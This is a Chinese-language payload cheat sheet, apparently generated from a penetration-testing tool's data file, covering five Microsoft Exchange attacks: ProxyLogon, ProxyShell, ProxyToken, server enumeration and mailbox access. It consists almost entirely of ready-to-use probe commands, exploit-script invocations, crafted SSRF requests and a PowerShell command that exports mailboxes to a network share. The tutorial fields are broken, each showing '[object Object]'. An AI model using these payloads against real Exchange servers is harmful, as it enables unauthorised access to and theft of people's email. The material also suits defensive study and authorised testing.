# Exchange攻击 — 内网渗透 payload

> 来源：src-hunter `references/payloader/raw/intranet.json`（5 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. ProxyLogon攻击

- **id:** `proxylogon`
- **分类:** Exchange攻击 / ProxyLogon
- **tags:** `exchange` `proxylogon` `cve-2021-26855`

CVE-2021-26855 Exchange SSRF

**前置条件**

- Exchange可访问

**利用步骤**

#### 探测漏洞

```
curl -k https://exchange.com/owa/auth/x.js
检查Exchange版本
```

检查Exchange版本

> platform: `linux`

#### 利用脚本

```
python proxylogon.py -u https://exchange.com -e admin@domain.com
获取管理员邮箱访问权限
```

利用ProxyLogon

| 片段 | 说明 | 类型 |
|---|---|---|
| `-u` | Exchange URL | parameter |
| `-e` | 目标邮箱 | parameter |

> platform: `linux`

#### 手动利用

```
POST /owa/auth/x.js HTTP/1.1
Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;
X-ClientId=xxx

构造SSRF请求
```

手动构造请求

**教程**

[object Object]

---

### 2. ProxyShell攻击

- **id:** `proxyshell`
- **分类:** Exchange攻击 / ProxyShell
- **tags:** `exchange` `proxyshell` `cve-2021-34473`

CVE-2021-34473 Exchange RCE

**前置条件**

- Exchange可访问

**利用步骤**

#### 探测漏洞

```
curl -k "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"
检查是否存在漏洞
```

探测漏洞

> platform: `linux`

#### 利用脚本

```
python proxyshell.py -u https://exchange.com -e admin@domain.com
获取邮箱访问并执行命令
```

利用ProxyShell

> platform: `linux`

#### 获取邮件

```
GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTTP/1.1
访问邮箱内容
```

访问邮箱

**教程**

[object Object]

---

### 3. Exchange枚举

- **id:** `exchange-enum`
- **分类:** Exchange攻击 / 枚举
- **tags:** `exchange` `enum` `recon`

枚举Exchange服务和配置

**前置条件**

- Exchange可访问

**利用步骤**

#### 版本探测

```
curl -k https://exchange.com/owa/auth/logon.aspx
检查页面源码获取版本信息
```

探测Exchange版本

> platform: `linux`

#### Autodiscover

```
curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml
获取Exchange配置信息
```

Autodiscover枚举

> platform: `linux`

#### 邮箱枚举

```
python oab.py https://exchange.com
下载离线通讯录枚举用户
```

枚举邮箱用户

> platform: `linux`

#### NTLM泄露

```
curl -k https://exchange.com/autodiscover/autodiscover.xml
从WWW-Authenticate头获取域信息
```

NTLM信息泄露

> platform: `linux`

**教程**

[object Object]

---

### 4. ProxyToken攻击

- **id:** `exchange-proxytoken`
- **分类:** Exchange攻击 / ProxyToken
- **tags:** `exchange` `proxytoken` `bypass`

利用Exchange ProxyToken绕过认证

**前置条件**

- Exchange服务器
- 存在漏洞

**利用步骤**

#### 检测漏洞

```
使用ProxyToken工具:
python proxytoken.py -u https://exchange.com -e user@domain.com
检测是否存在漏洞
```

检测漏洞

> platform: `linux`

#### 利用漏洞

```
python proxytoken.py -u https://exchange.com -e user@domain.com -a
获取用户邮箱访问权限
```

获取邮箱访问

| 片段 | 说明 | 类型 |
|---|---|---|
| `ProxyToken` | 利用前端代理认证绕过 | keyword |
| `EWS接口` | 通过EWS访问邮箱 | keyword |

> platform: `linux`

#### 访问邮箱

```
curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"
绕过认证访问EWS
```

访问EWS接口

**教程**

[object Object]

---

### 5. Exchange邮箱访问

- **id:** `exchange-mailbox-access`
- **分类:** Exchange攻击 / 邮箱访问
- **tags:** `exchange` `mailbox` `access`

通过各种方式访问Exchange邮箱

**前置条件**

- Exchange凭证或漏洞

**利用步骤**

#### OWA访问

```
https://exchange.com/owa
使用凭证登录OWA
查看邮件、日历等
```

OWA Web访问

#### EWS访问

```
使用Impacket:
python exchanger.py domain/user:password@exchange.com
或使用EWSTools
```

EWS API访问

> platform: `linux`

#### Outlook MAPI

```
配置Outlook连接Exchange
使用MAPI协议访问邮箱
支持邮件、日历、联系人
```

Outlook客户端

| 片段 | 说明 | 类型 |
|---|---|---|
| `OWA` | Outlook Web App | keyword |
| `EWS` | Exchange Web Services | keyword |
| `MAPI` | Messaging API | keyword |

> platform: `windows`

#### 导出邮箱

```
PowerShell:
New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user.pst"
导出邮箱为PST文件
```

导出邮箱

> platform: `windows`

**教程**

[object Object]
